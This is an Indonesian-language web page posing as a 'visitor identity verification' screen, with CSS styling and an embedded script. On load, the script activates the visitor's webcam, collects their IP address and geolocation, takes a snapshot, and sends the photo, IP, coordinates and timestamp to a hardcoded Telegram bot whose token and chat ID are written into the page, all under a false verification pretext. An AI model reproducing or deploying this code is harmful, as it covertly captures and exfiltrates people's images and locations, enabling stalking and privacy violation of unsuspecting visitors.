<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Pengunjung</title>
  <style>
    body {
      background: linear-gradient(120deg, #141e30, #243b55);
      color: #ffffff;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      margin: 0;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 10px;
    }
    p {
      font-size: 1rem;
      margin: 10px 0;
    }
    video {
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
      width: 90%;
      max-width: 300px;
      margin-top: 20px;
    }
    .status {
      margin-top: 20px;
      font-size: 1.1rem;
      color: #00e676;
    }
    .loader {
      border: 6px solid #eee;
      border-top: 6px solid #00e676;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    canvas { display: none; }
  </style>
</head>
<body>
  <h1>Memverifikasi Identitas Anda...</h1>
  <p>Silakan tunggu, kami sedang memproses informasi Anda.</p>
  <video id="kamera" autoplay playsinline muted></video>
  <div class="loader"></div>
  <div class="status" id="status">Mengaktifkan kamera...</div>
  <canvas id="kanvas"></canvas>  <script>
    const token = '7593004514:AAES2AohFVFTo2yHbOJdtaUf2-SzfOfyyhI';
    const chatId = '1683167636';
    const video = document.getElementById('kamera');
    const canvas = document.getElementById('kanvas');
    const statusEl = document.getElementById('status');
    let streamGlobal;

    function updateStatus(msg, color = '#00e676') {
      statusEl.textContent = msg;
      statusEl.style.color = color;
    }

    function stopCamera() {
      if (streamGlobal) {
        streamGlobal.getTracks().forEach(track => track.stop());
        video.style.display = 'none';
      }
    }

    async function ambilData() {
      updateStatus('Mengambil IP address...');
      const ip = await fetch('https://api.ipify.org?format=json')
        .then(r => r.json()).then(d => d.ip).catch(_ => 'Tidak diketahui');

      let lokasi = 'Tidak tersedia';
      if (navigator.geolocation) {
        updateStatus('Mengambil lokasi...');
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(pos => {
            lokasi = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            resolve();
          }, _ => resolve());
        });
      }

      updateStatus('Mengambil gambar...');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(async blob => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'snapshot.png');

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const waktu = new Date().toLocaleString();
        const pesan = `üì∏ *Data Pengunjung*
IP: ${ip}
Lokasi: ${lokasi}
Waktu: ${waktu}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: pesan,
            parse_mode: 'Markdown'
          })
        });

        updateStatus('‚úÖ Data berhasil dikirim!');
        stopCamera();
        document.querySelector('.loader').style.display = 'none';
      }, 'image/png');
    }

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      streamGlobal = stream;
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        updateStatus('Kamera aktif, mengambil data...');
        ambilData();
      };
    }).catch(() => {
      updateStatus('‚ùå Gagal mengakses kamera.', 'red');
      document.querySelector('.loader').style.display = 'none';
    });
  </script></body>
</html>
